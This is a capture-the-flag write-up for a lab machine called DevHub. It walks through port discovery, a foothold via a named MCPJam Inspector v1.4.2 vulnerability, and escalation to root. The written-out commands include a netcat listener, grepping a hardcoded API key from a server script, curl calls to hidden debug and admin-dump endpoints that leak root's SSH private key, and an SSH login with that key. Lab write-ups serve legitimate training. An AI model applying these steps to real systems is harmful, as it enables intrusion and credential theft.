# DevHub Writeup

## Reconnaissance
During the initial reconnaissance phase, we explored the open ports on the target machine. On port 80, the web source code indicated two primary services running:
- An active Model Context Protocol (MCP) development and debugging tool on port 6274.
- An internal-only Jupyter-based analytics environment running on `localhost:8888`.

```html
<p>Model Context Protocol development and debugging tool. Used by the dev team for building and testing MCP servers.</p>
<span class="status active">Active - Port 6274</span>

<p>Jupyter-based analytics environment for data processing and visualization. Access restricted to analyst team.</p>
<span class="status internal">Internal Only - localhost:8888</span>
```

### Investigating Port 6274
Accessing port 6274 revealed the **MCPJam Inspector** application.
![[Pasted image 20260827133743.png]]

```html
<!doctype html> <html lang="en"> <head> <meta charset="UTF-8" /> <link rel="icon" type="image/svg+xml" href="[/mcp_jam.svg](view-source:http://devhub.htb:6274/mcp_jam.svg)" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <title>MCPJam Inspector</title> <script type="module" crossorigin src="[/assets/index-DRYhT9Xb.js](view-source:http://devhub.htb:6274/assets/index-DRYhT9Xb.js)"></script> <link rel="stylesheet" crossorigin href="[/assets/index-XvFRNbCs.css](view-source:http://devhub.htb:6274/assets/index-XvFRNbCs.css)"> </head> <body> <div id="root"></div> </body> </html>
```

To verify connectivity and data transmission, we set up a netcat listener and observed a connection from the target:
```sh
┌──(julicc㉿arceus)-[~]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.14.126] from (UNKNOWN) [10.129.245.216] 39430
POST / HTTP/1.1
host: 10.10.14.126:8080
connection: keep-alive
content-type: application/json
...
{"method":"initialize","params":{"protocolVersion":"2025-11-25","capabilities":{"elicitation":{}},"clientInfo":{"name":"prueba","version":"1.0.0"}},"jsonrpc":"2.0","id":0}
```

By identifying the application version (**MCPJam Version: v1.4.2**), we discovered a known vulnerability.
![[Pasted image 20260827134500.png]]

## Foothold / Initial Access
Using an exploit for MCPJam v1.4.2, we successfully gained initial access to the machine as a standard user.
![[Pasted image 20260828001712.png]]

Once inside, we enumerated listening services and running processes:
```sh
ss -tuln
...
tcp         LISTEN       0            128                     127.0.0.1:8888                    0.0.0.0:*
...
tcp         LISTEN       0            128                     127.0.0.1:5000                    0.0.0.0:*
...

ps aux | grep "jupyter"
analyst     1084  0.8  2.5 409416 103704 ?       Ssl  13:29   0:06 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab ...
root        1091  0.1  0.7  37376 28700 ?        Ss   13:29   0:01 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

We found that Jupyter is running on port 8888, and a custom Python server (`/opt/opsmcp/server.py`) is executing on port 5000 as root. To investigate the Jupyter notebook environment, we set up an SSH port forward:
```sh
ssh -L 8888:localhost:8888 mcp-dev@devhub
```
![[Pasted image 20260828004535.png]]

## Privilege Escalation
After uploading and running `linpeas.sh`, we found the following interesting symbolic link:
```sh
0 lrwxrwxrwx 1 manalyst analyst   16 Jan 22  2026 /home/analyst/jupyter-env/bin/python3 -> /usr/bin/python3 
```

Focusing on the internal service running on port 5000, we accessed it via the browser (through port forwarding).
![[Pasted image 20260828155142.png]]

Browsing the service directories indicated that an API Key was required to interact with the endpoints.
![[Pasted image 20260828155304.png]]

Since the `server.py` file was owned by our user or world-readable, we extracted the hardcoded API Key directly from the source code:
```sh
analyst@devhub:~$ cat /opt/opsmcp/server.py | grep -i "api_key\|API_KEY\|X-API-Key"
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY
...
```
![[Pasted image 20260828161351.png]]

With the valid API Key, we tested calling the available tools via HTTP POST requests:
```sh
curl -X POST \
     -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
     -H "Content-Type: application/json" \
     -d '{"name": "ops.system_status"}' \
     http://127.0.0.1:5000/tools/call
```

Analyzing the full source code of `/opt/opsmcp/server.py` revealed hidden debug and administrative tools:
```python
    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })

    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)

        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
...
```

By first enabling debug mode and then executing the `ops._admin_dump` tool with the appropriate arguments, we successfully dumped the `root` user's private SSH key:
```sh
analyst@devhub:~$ curl -X POST -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" -d '{"name": "ops._debug_mode"}' http://127.0.0.1:5000/tools/call

analyst@devhub:~$ curl -X POST -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}' http://127.0.0.1:5000/tools/call
```

We saved the extracted private key to a local file, fixed its permissions, and used it to SSH into the machine as root:
```sh
┌──(julicc㉿arceus)-[~/devhub.htb/exploits]
└─$ echo -e "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\n...<SNIP>...\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----" > id_rsa

┌──(julicc㉿arceus)-[~/devhub.htb/exploits]
└─$ chmod 600 id_rsa

┌──(julicc㉿arceus)-[~/devhub.htb/exploits]
└─$ ssh -i id_rsa root@devhub.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
...
root@devhub:~#
```

## Conclusion
The DevHub machine was successfully compromised by identifying an outdated and vulnerable version of the MCPJam Inspector application (v1.4.2) on port 6274. Initial access provided a foothold, allowing for internal network enumeration. Privilege escalation to the `root` user was achieved by abusing an internally exposed API (port 5000) that possessed hidden endpoints. By extracting the hardcoded API key from the world-readable server script and leveraging the `ops._admin_dump` debug function, we successfully dumped the root user's SSH private key and gained full administrative access to the system.
